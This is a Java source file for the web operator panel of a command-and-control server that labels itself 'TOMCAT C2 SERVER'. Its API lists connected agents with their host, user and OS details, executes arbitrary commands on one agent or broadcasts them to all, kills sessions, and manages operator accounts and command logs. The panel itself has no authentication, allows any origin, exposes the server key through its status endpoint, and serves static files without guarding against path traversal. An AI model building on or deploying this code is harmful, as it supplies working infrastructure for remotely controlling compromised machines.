package com.tomcat.iface;

import com.google.gson.Gson;
import com.sun.net.httpserver.*;
import com.tomcat.core.db.TeamDatabase;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.server.ListenerMode;
import com.tomcat.core.server.TomcatServer;
import com.tomcat.core.session.Session;
import com.tomcat.utils.ServerConfig;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;

public class WebApp {

    private final ServerConfig Config;
    private final ListenerMode ActiveMode;
    private final TeamDatabase Db;
    private TomcatServer Server;
    private HttpServer HttpSrv;
    private Instant ServerStartTime;
    private final List<String> Logs = new CopyOnWriteArrayList<>();
    private final int MaxLogs;
    private final Gson GsonInst = new Gson();
    private final Path BaseDir;

    public WebApp(ServerConfig Config, ListenerMode Mode) {
        this.Config = Config;
        this.ActiveMode = Mode;
        this.MaxLogs = Config.GetMaxLogEntries();
        this.BaseDir = ResolveBaseDir();
        this.Db = TeamDatabase.Connect(Config);
    }

    private Path ResolveBaseDir() {
        try {
            Path JarPath = Paths.get(WebApp.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            for (Path P : new Path[] {
                JarPath.getParent(),
                JarPath.getParent() != null ? JarPath.getParent().getParent() : null,
            }) {
                if (P != null && Files.exists(P.resolve("config"))) return P.toAbsolutePath();
            }
        } catch (Exception Ignored) {}
        Path Cwd = Paths.get("").toAbsolutePath();
        if (Files.exists(Cwd.resolve("config"))) return Cwd;
        Path CwdP = Cwd.getParent();
        return (CwdP != null && Files.exists(CwdP.resolve("config"))) ? CwdP : Cwd;
    }

    private Path ResolvePath(String Relative) {
        Path Direct = Paths.get(Relative);
        if (Direct.isAbsolute() && Files.exists(Direct)) return Direct;
        Path FromBase = BaseDir.resolve(Relative);
        if (Files.exists(FromBase)) return FromBase;
        return Paths.get("").toAbsolutePath().resolve(Relative);
    }

    public void Run(String WebHost, int WebPort) throws Exception {
        HttpSrv = HttpServer.create(new InetSocketAddress(WebHost, WebPort), 100);
        SetupRoutes();
        HttpSrv.setExecutor(Executors.newFixedThreadPool(20));
        HttpSrv.start();
        Logger.Info("Web Panel Started On http://" + WebHost + ":" + WebPort);
        Logger.Info("Static Dir : " + ResolvePath(Config.GetStaticDir()));
        Logger.Info("Template Dir: " + ResolvePath(Config.GetTemplateDir()));
        AddLog("=".repeat(70));
        AddLog("TOMCAT C2 SERVER INITIALIZED — MODE: " + ActiveMode.name());
        AddLog("=".repeat(70));
    }

    private void SetupRoutes() {
        HttpSrv.createContext("/", new StaticHandler());
        HttpSrv.createContext("/api/server/status", Ex -> Handle(Ex, this::ApiServerStatus));
        HttpSrv.createContext("/api/server/start", Ex -> Handle(Ex, this::ApiServerStart));
        HttpSrv.createContext("/api/server/stop", Ex -> Handle(Ex, this::ApiServerStop));
        HttpSrv.createContext("/api/agents", Ex -> Handle(Ex, this::ApiGetAgents));
        HttpSrv.createContext("/api/agents/kill", Ex -> Handle(Ex, this::ApiKillAgent));
        HttpSrv.createContext("/api/logs", Ex -> Handle(Ex, this::ApiGetLogs));
        HttpSrv.createContext("/api/logs/clear", Ex -> Handle(Ex, this::ApiClearLogs));
        HttpSrv.createContext("/api/command/execute", Ex -> Handle(Ex, this::ApiExecuteCommand));
        HttpSrv.createContext("/api/command/broadcast", Ex -> Handle(Ex, this::ApiBroadcast));
        HttpSrv.createContext("/api/command/broadcastall", Ex -> Handle(Ex, this::ApiBroadcastAll));
        HttpSrv.createContext("/api/command/history", Ex -> Handle(Ex, this::ApiCommandHistory));
        HttpSrv.createContext("/api/sessions/history", Ex -> Handle(Ex, this::ApiSessionHistory));
        HttpSrv.createContext("/api/team/operators", Ex -> Handle(Ex, this::ApiGetOperators));
        HttpSrv.createContext("/api/team/operators/create", Ex -> Handle(Ex, this::ApiCreateOperator));
        HttpSrv.createContext("/api/team/operators/role", Ex -> Handle(Ex, this::ApiUpdateRole));
        HttpSrv.createContext("/api/team/operators/delete", Ex -> Handle(Ex, this::ApiDeleteOperator));
        HttpSrv.createContext("/api/team/note", Ex -> Handle(Ex, this::ApiSetNote));
    }

    @FunctionalInterface
    interface RequestHandler {
        String Handle(HttpExchange E) throws Exception;
    }

    private void Handle(HttpExchange E, RequestHandler H) {
        try {
            E.getResponseHeaders().add("Content-Type", "application/json");
            E.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
            E.getResponseHeaders().add("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
            E.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type,Authorization");
            if (E.getRequestMethod().equalsIgnoreCase("OPTIONS")) {
                E.sendResponseHeaders(200, -1);
                return;
            }
            byte[] Bytes = H.Handle(E).getBytes("UTF-8");
            E.sendResponseHeaders(200, Bytes.length);
            try (OutputStream Os = E.getResponseBody()) {
                Os.write(Bytes);
            }
        } catch (Exception Ex) {
            try {
                byte[] Bytes = GsonInst.toJson(Map.of("Error", String.valueOf(Ex.getMessage()))).getBytes("UTF-8");
                E.sendResponseHeaders(500, Bytes.length);
                try (OutputStream Os = E.getResponseBody()) {
                    Os.write(Bytes);
                }
            } catch (IOException Ignored) {}
        }
    }

    private String ApiServerStatus(HttpExchange E) {
        boolean Running = Server != null && Server.IsRunning();
        Map<String, Object> R = new LinkedHashMap<>();
        R.put("Status", Running ? "Online" : "Offline");
        R.put("Mode", ActiveMode.name());
        R.put("Host", Running ? Server.GetHost() : Config.GetServerHost());
        R.put("Port", Running ? Server.GetPort() : Config.GetServerPort());
        R.put("StartedAt", ServerStartTime != null ? ServerStartTime.getEpochSecond() : 0);
        R.put("Uptime", GetUptime());
        R.put("Agents", Running ? Server.GetSessions().Count() : 0);
        R.put("DbConnected", Db.IsConnected());
        R.put("DbType", Config.GetDbType());
        // Guard: don't call GetKeyBase64 when server is null
        if (Running) R.put("Key", Server.GetKeyBase64());
        return GsonInst.toJson(R);
    }

    private String ApiServerStart(HttpExchange E) throws Exception {
        if (Server != null && Server.IsRunning()) return GsonInst.toJson(
            Map.of("Success", false, "Message", "Already running")
        );
        Map<String, Object> Body = ParseBody(E);
        String Host = Str(Body, "Host", Config.GetServerHost());
        int Port = IntVal(Body, "Port", Config.GetServerPort());
        Server = new TomcatServer(Host, Port, ActiveMode, Config);
        Server.AddEventListener(this::OnEvent);
        boolean[] Result = Server.StartServer();
        if (!Result[0]) {
            AddLog("[!] Failed to start server");
            return GsonInst.toJson(Map.of("Success", false, "Message", "Failed to start"));
        }
        ServerStartTime = Instant.now();
        AddLog("[+] Server started on " + Host + ":" + Port + " [" + ActiveMode.name() + "]");
        new Thread(Server::AcceptConnections, "AcceptConnections").start();
        return GsonInst.toJson(
            Map.of(
                "Success",
                true,
                "Host",
                Host,
                "Port",
                Port,
                "Mode",
                ActiveMode.name(),
                "StartedAt",
                ServerStartTime.getEpochSecond()
            )
        );
    }

    private String ApiServerStop(HttpExchange E) {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
            Map.of("Success", false, "Message", "Not running")
        );
        Server.StopServer();
        Server = null;
        ServerStartTime = null;
        AddLog("[!] Server stopped");
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiGetAgents(HttpExchange E) {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
        List<Map<String, Object>> Agents = new ArrayList<>();
        for (Session S : Server.GetSessions().GetAll()) {
            Map<String, Object> A = new LinkedHashMap<>();
            A.put("ID", S.GetId());
            A.put("Address", S.GetRemoteAddress());
            A.put("OS", S.GetOs());
            A.put("Hostname", S.GetHostname());
            A.put("User", S.GetUser());
            A.put("Arch", S.GetArch());
            A.put("AgentIP", S.GetAgentIp());
            A.put("AgentName", S.GetAgentName());
            A.put("JoinedAt", S.GetJoinedAt());
            A.put("Type", S.GetSessionType().name());
            A.put("ShellMode", S.GetShellMode());
            A.put("Encrypted", S.IsEncrypted());
            A.put("MtlsEnabled", S.IsMtlsEnabled());
            A.put("Note", Db.GetAgentNote(S.GetId()));
            Agents.add(A);
        }
        return GsonInst.toJson(Map.of("Agents", Agents));
    }

    private String ApiKillAgent(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
            Map.of("Success", false, "Message", "Server not running")
        );
        int Id = IntVal(ParseBody(E), "AgentId", 0);
        if (Id == 0) return GsonInst.toJson(Map.of("Success", false, "Message", "AgentId required"));
        Server.RemoveSession(Id);
        AddLog("[KILL] Agent-" + Id + " terminated");
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiGetLogs(HttpExchange E) {
        return GsonInst.toJson(Map.of("Logs", new ArrayList<>(Logs)));
    }

    private String ApiClearLogs(HttpExchange E) {
        Logs.clear();
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiExecuteCommand(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
            Map.of("Success", false, "Output", "Server not running")
        );
        Map<String, Object> Body = ParseBody(E);
        int AgentId = IntVal(Body, "AgentId", 0);
        String Command = Str(Body, "Command", "");
        String Operator = Str(Body, "Operator", "system");
        if (AgentId == 0 || Command.isEmpty()) return GsonInst.toJson(
            Map.of("Success", false, "Output", "Missing AgentId or Command")
        );
        AddLog("[>] [" + Operator + "] Agent-" + AgentId + " » " + Command);
        String[] Result = Server.ExecuteCommand(AgentId, Command);
        boolean Ok = Boolean.parseBoolean(Result[0]);
        Db.SaveCommandLog(AgentId, Operator, Command, Result[1], Ok);
        AddLog(Ok ? "[+] " + Result[1] : "[!] " + Result[1]);
        return GsonInst.toJson(Map.of("Success", Ok, "Output", Result[1], "Command", Command));
    }

    private String ApiBroadcast(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
            Map.of("Success", false, "Output", "Server not running")
        );
        Map<String, Object> Body = ParseBody(E);
        String Command = Str(Body, "Command", "");
        String Operator = Str(Body, "Operator", "system");
        @SuppressWarnings("unchecked")
        List<Object> RawIds = (List<Object>) Body.getOrDefault("AgentIds", new ArrayList<>());
        if (Command.isEmpty()) return GsonInst.toJson(Map.of("Success", false, "Message", "Missing Command"));
        List<Integer> Ids = new ArrayList<>();
        for (Object O : RawIds) {
            try {
                Ids.add((int) Double.parseDouble(O.toString()));
            } catch (Exception Ignored) {}
        }
        if (Ids.isEmpty()) return GsonInst.toJson(Map.of("Success", false, "Message", "No AgentIds"));
        AddLog("[BROADCAST] [" + Operator + "] → " + Ids.size() + " agents » " + Command);
        Map<Integer, String[]> Results = Server.BroadcastCommand(Ids, Command);
        Map<String, Object> OutMap = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
            OutMap.put(String.valueOf(En.getKey()), Map.of("Success", Ok, "Output", En.getValue()[1]));
            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1], Ok);
        }
        return GsonInst.toJson(Map.of("Success", true, "Results", OutMap, "Count", Results.size()));
    }

    private String ApiBroadcastAll(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
            Map.of("Success", false, "Output", "Server not running")
        );
        Map<String, Object> Body = ParseBody(E);
        String Command = Str(Body, "Command", "");
        String Operator = Str(Body, "Operator", "system");
        if (Command.isEmpty()) return GsonInst.toJson(Map.of("Success", false, "Message", "Missing Command"));
        AddLog("[BROADCAST-ALL] [" + Operator + "] → " + Server.GetSessions().Count() + " agents » " + Command);
        Map<Integer, String[]> Results = Server.BroadcastAll(Command);
        Map<String, Object> OutMap = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
            OutMap.put(String.valueOf(En.getKey()), Map.of("Success", Ok, "Output", En.getValue()[1]));
            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1], Ok);
        }
        return GsonInst.toJson(Map.of("Success", true, "Results", OutMap, "Count", Results.size()));
    }

    private String ApiCommandHistory(HttpExchange E) throws Exception {
        Map<String, Object> Body = ParseBody(E);
        return GsonInst.toJson(
            Map.of("History", Db.GetCommandHistory(IntVal(Body, "AgentId", 0), IntVal(Body, "Limit", 100)))
        );
    }

    private String ApiSessionHistory(HttpExchange E) throws Exception {
        return GsonInst.toJson(Map.of("Sessions", Db.GetSessionHistory(IntVal(ParseBody(E), "Limit", 100))));
    }

    private String ApiGetOperators(HttpExchange E) {
        return GsonInst.toJson(Map.of("Operators", Db.GetOperators()));
    }

    private String ApiCreateOperator(HttpExchange E) throws Exception {
        Map<String, Object> Body = ParseBody(E);
        String User = Str(Body, "Username", "");
        String Pass = Str(Body, "Password", "");
        String Role = Str(Body, "Role", "OPERATOR");
        if (User.isEmpty() || Pass.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username and Password required"));
        if (Pass.length() < 8) return GsonInst.toJson(Map.of("Error", "Password must be at least 8 characters"));
        TeamDatabase.OperatorRole R = TeamDatabase.OperatorRole.FromString(Role);
        if (!Db.CreateOperator(User, TeamDatabase.HashPassword(Pass), R)) return GsonInst.toJson(
            Map.of("Error", "Username already exists")
        );
        AddLog("[TEAM] Operator created: " + User + " [" + R + "]");
        return GsonInst.toJson(Map.of("Success", true, "Username", User, "Role", R.name()));
    }

    private String ApiUpdateRole(HttpExchange E) throws Exception {
        Map<String, Object> Body = ParseBody(E);
        String User = Str(Body, "Username", "");
        String Role = Str(Body, "Role", "");
        if (User.isEmpty() || Role.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username and Role required"));
        if (User.equals("admin")) return GsonInst.toJson(Map.of("Error", "Cannot change admin role"));
        TeamDatabase.OperatorRole R = TeamDatabase.OperatorRole.FromString(Role);
        Db.UpdateOperatorRole(User, R);
        AddLog("[TEAM] Role updated: " + User + " → " + R);
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiDeleteOperator(HttpExchange E) throws Exception {
        String User = Str(ParseBody(E), "Username", "");
        if (User.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username required"));
        if (User.equals("admin")) return GsonInst.toJson(Map.of("Error", "Cannot delete admin"));
        boolean Del = Db.DeleteOperator(User);
        if (Del) AddLog("[TEAM] Operator deleted: " + User);
        return GsonInst.toJson(Map.of("Success", Del));
    }

    private String ApiSetNote(HttpExchange E) throws Exception {
        Map<String, Object> Body = ParseBody(E);
        Db.SetAgentNote(IntVal(Body, "AgentId", 0), Str(Body, "Note", ""));
        return GsonInst.toJson(Map.of("Success", true));
    }

    private void OnEvent(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case AgentConnected -> {
                AddLog(
                    String.format(
                        "[+] Session-%s [%s] %s@%s %s",
                        Data.get("ID"),
                        Data.get("Type"),
                        Data.get("User"),
                        Data.get("Hostname"),
                        Data.get("OS")
                    )
                );
                Db.SaveSessionEvent(Data, "connected");
            }
            case AgentDisconnected -> {
                AddLog("[!] Session-" + Data.get("ID") + " disconnected: " + Data.get("Reason"));
                Db.SaveSessionEvent(Data, "disconnected");
            }
            case Error -> AddLog("[!] " + Data.get("Message"));
        }
    }

    private Map<String, Object> ParseBody(HttpExchange E) throws Exception {
        try (InputStream Is = E.getRequestBody()) {
            String Body = new String(Is.readAllBytes(), "UTF-8");
            if (Body.isEmpty()) return new HashMap<>();
            return GsonInst.fromJson(Body, Map.class);
        }
    }

    private void AddLog(String Msg) {
        String Entry = "[" + LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")) + "] " + Msg;
        Logs.add(Entry);
        if (Logs.size() > MaxLogs) Logs.remove(0);
        Db.SaveLog(Entry);
    }

    private String GetUptime() {
        if (ServerStartTime == null) return "00:00:00";
        long S = Duration.between(ServerStartTime, Instant.now()).getSeconds();
        return String.format("%02d:%02d:%02d", S / 3600, (S % 3600) / 60, S % 60);
    }

    private static String Str(Map<String, Object> M, String K, String Def) {
        Object V = M.get(K);
        return V != null ? V.toString() : Def;
    }

    private static int IntVal(Map<String, Object> M, String K, int Def) {
        try {
            return (int) Double.parseDouble(M.getOrDefault(K, Def).toString());
        } catch (Exception E) {
            return Def;
        }
    }

    class StaticHandler implements HttpHandler {

        @Override
        public void handle(HttpExchange E) throws IOException {
            String ReqPath = E.getRequestURI().getPath();
            Path Target = null;
            if (ReqPath.equals("/") || ReqPath.equals("/index.html")) {
                Path Tpl = ResolvePath(Config.GetTemplateDir() + "/index.html");
                if (Files.exists(Tpl)) Target = Tpl;
            } else {
                String Rel = ReqPath.startsWith("/static/") ? ReqPath.substring(7) : ReqPath;
                Path Stat = ResolvePath(Config.GetStaticDir() + Rel);
                if (Files.exists(Stat) && !Files.isDirectory(Stat)) Target = Stat;
            }
            if (Target == null) {
                byte[] R = ("404 Not Found: " + ReqPath).getBytes();
                E.sendResponseHeaders(404, R.length);
                try (OutputStream O = E.getResponseBody()) {
                    O.write(R);
                }
                return;
            }
            E.getResponseHeaders().add("Content-Type", ContentType(Target.toString()));
            byte[] Data = Files.readAllBytes(Target);
            E.sendResponseHeaders(200, Data.length);
            try (OutputStream O = E.getResponseBody()) {
                O.write(Data);
            }
        }

        private String ContentType(String P) {
            if (P.endsWith(".html")) return "text/html; charset=UTF-8";
            if (P.endsWith(".css")) return "text/css";
            if (P.endsWith(".js")) return "application/javascript";
            if (P.endsWith(".json")) return "application/json";
            if (P.endsWith(".png")) return "image/png";
            if (P.endsWith(".svg")) return "image/svg+xml";
            if (P.endsWith(".ico")) return "image/x-icon";
            return "application/octet-stream";
        }
    }
}
